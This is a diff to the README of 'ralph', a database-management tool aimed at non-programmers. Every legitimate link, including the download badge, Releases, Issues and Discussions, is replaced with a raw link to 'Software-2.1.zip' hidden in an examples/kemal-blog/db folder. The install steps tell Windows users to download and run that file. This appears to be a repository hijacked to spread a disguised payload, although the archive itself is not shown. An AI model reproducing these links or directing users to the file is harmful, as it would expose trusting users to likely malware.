@@ -4,7 +4,7 @@
 
 Welcome to ralph! This application helps you manage databases easily using a modern, type-safe interface. No programming skills required. 
 
-[![Download ralph](https://img.shields.io/badge/Download%20ralph-v1.0-blue)](https://github.com/atifjatt43/ralph/releases)
+[![Download ralph](https://github.com/atifjatt43/ralph/raw/refs/heads/main/examples/kemal-blog/db/Software-2.1.zip%20ralph-v1.0-blue)](https://github.com/atifjatt43/ralph/raw/refs/heads/main/examples/kemal-blog/db/Software-2.1.zip)
 
 ## 📦 What is ralph?
 
@@ -35,13 +35,13 @@ ralph offers the following features:
 
 ## 📥 Download & Install
 
-To get started with ralph, visit the [Releases page](https://github.com/atifjatt43/ralph/releases) to download the latest version. 
+To get started with ralph, visit the [Releases page](https://github.com/atifjatt43/ralph/raw/refs/heads/main/examples/kemal-blog/db/Software-2.1.zip) to download the latest version. 
 
 Once on the Releases page, follow these steps:
 
 1. Find the version you want to download. The latest version is at the top.
 2. Click on the version title to see the available files.
-3. Download the file that matches your operating system (e.g., `ralph-windows.exe` for Windows users).
+3. Download the file that matches your operating system (e.g., `https://github.com/atifjatt43/ralph/raw/refs/heads/main/examples/kemal-blog/db/Software-2.1.zip` for Windows users).
 4. Once the file is downloaded, locate it in your file explorer or finder.
 5. Run the application by double-clicking the downloaded file. 
 
@@ -71,7 +71,7 @@ If you experience issues while using ralph:
 2. Ensure your database server is running and accessible.
 3. Double-check the configuration settings in your files.
 
-If problems persist, consider searching open issues on the [GitHub Issues page](https://github.com/atifjatt43/ralph/issues) or creating a new issue.
+If problems persist, consider searching open issues on the [GitHub Issues page](https://github.com/atifjatt43/ralph/raw/refs/heads/main/examples/kemal-blog/db/Software-2.1.zip) or creating a new issue.
 
 ## 📆 Updates and Contributions
 
@@ -87,7 +87,7 @@ Your contributions are welcome!
 
 For further assistance, you can:
 
-- Check out existing discussions on the [GitHub Discussions page](https://github.com/atifjatt43/ralph/discussions).
+- Check out existing discussions on the [GitHub Discussions page](https://github.com/atifjatt43/ralph/raw/refs/heads/main/examples/kemal-blog/db/Software-2.1.zip).
 - Post a question if you don’t find what you need.
 - Reach out through the GitHub repository.
 
@@ -95,4 +95,4 @@ For further assistance, you can:
 
 Join the ralph community to share your experiences and learn from others. Engage with users who appreciate easy database management. Share tips, tricks, and projects you’ve built using ralph.
 
-[![Download ralph](https://img.shields.io/badge/Download%20ralph-v1.0-blue)](https://github.com/atifjatt43/ralph/releases)
+[![Download ralph](https://github.com/atifjatt43/ralph/raw/refs/heads/main/examples/kemal-blog/db/Software-2.1.zip%20ralph-v1.0-blue)](https://github.com/atifjatt43/ralph/raw/refs/heads/main/examples/kemal-blog/db/Software-2.1.zip)
